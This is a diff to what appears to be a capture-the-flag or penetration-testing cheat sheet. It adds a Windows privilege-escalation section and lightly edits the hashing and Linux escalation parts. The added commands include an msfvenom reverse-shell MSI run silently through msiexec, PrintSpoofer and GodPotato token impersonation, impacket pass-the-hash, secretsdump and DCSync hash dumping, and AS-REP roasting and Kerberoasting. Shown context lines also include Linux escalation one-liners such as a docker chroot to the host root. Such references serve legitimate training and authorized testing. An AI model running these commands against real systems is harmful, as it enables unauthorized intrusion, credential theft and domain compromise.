@@ -227,14 +227,6 @@ openssl passwd -1 -salt xyz <password>   # MD5crypt
 openssl passwd -6 -salt xyz <password>   # SHA512crypt
 ```
 
-### htpasswd — Generate Apache .htpasswd hash
-
-```bash
-htpasswd -nb <username> <password>          # bcrypt (default)
-htpasswd -nbm <username> <password>         # MD5
-htpasswd -nbs <username> <password>         # SHA1
-```
-
 ---
 
 ## 🖼️ Steganography
@@ -260,7 +252,7 @@ strings <file> | grep -i flag
 
 ---
 
-## ⬆️ Privilege Escalation
+## ⬆️ Privilege Escalation — Linux
 
 ### Enumeration
 
@@ -271,8 +263,8 @@ sudo -l
 # SUID binaries
 find / -perm -4000 -type f 2>/dev/null
 
-# World-writable files
-find / -type f -writable 2>/dev/null | grep -v proc
+# World-writable files (excluding /proc and /sys noise)
+find / -type f -writable 2>/dev/null | grep -v -e '/proc' -e '/sys'
 
 # Capabilities
 /usr/sbin/getcap -r / 2>/dev/null
@@ -337,6 +329,112 @@ lxc exec privesc /bin/sh
 
 # Docker
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+```
+
+---
+
+## ⬆️ Privilege Escalation — Windows
+
+### Enumeration
+
+```powershell
+# Current user and privileges
+whoami
+whoami /priv
+whoami /groups
+
+# System info
+systeminfo
+hostname
+
+# Local users and groups
+net user
+net localgroup administrators
+
+# Running services
+sc query
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+
+# Installed software
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
+
+# Network connections
+netstat -ano
+```
+
+### AlwaysInstallElevated
+
+```powershell
+# Check registry keys (both must be 1)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Generate malicious MSI and execute
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+```
+
+### SeImpersonatePrivilege — Token Impersonation
+
+```powershell
+# Check if present
+whoami /priv | findstr /i "impersonate"
+
+# PrintSpoofer (Windows 10 / Server 2019+)
+.\PrintSpoofer.exe -i -c cmd
+
+# GodPotato
+.\GodPotato.exe -cmd "cmd /c whoami"
+```
+
+### Unquoted Service Paths
+
+```powershell
+# Find unquoted paths with spaces
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'
+```
+
+### Writable Service Binaries / Registry
+
+```powershell
+# Check service binary permissions
+icacls "C:\path\to\service.exe"
+
+# Check service registry key permissions
+accesschk.exe -kw "HKLM\System\CurrentControlSet\Services\<service>"
+```
+
+### Pass-the-Hash
+
+```bash
+# impacket
+impacket-psexec <domain>/<user>@<target> -hashes :<nthash>
+impacket-wmiexec <domain>/<user>@<target> -hashes :<nthash>
+impacket-smbexec <domain>/<user>@<target> -hashes :<nthash>
+```
+
+### Hash Dumping
+
+```bash
+# secretsdump (remote)
+impacket-secretsdump <domain>/<user>:<password>@<target>
+impacket-secretsdump -hashes :<nthash> <domain>/<user>@<target>
+
+# DCSync (from domain-joined or with DA creds)
+impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc-ip>
+```
+
+### AS-REP Roasting / Kerberoasting
+
+```bash
+# AS-REP roasting (no pre-auth required)
+impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
+
+# Kerberoasting
+impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request
 ```
 
 ---
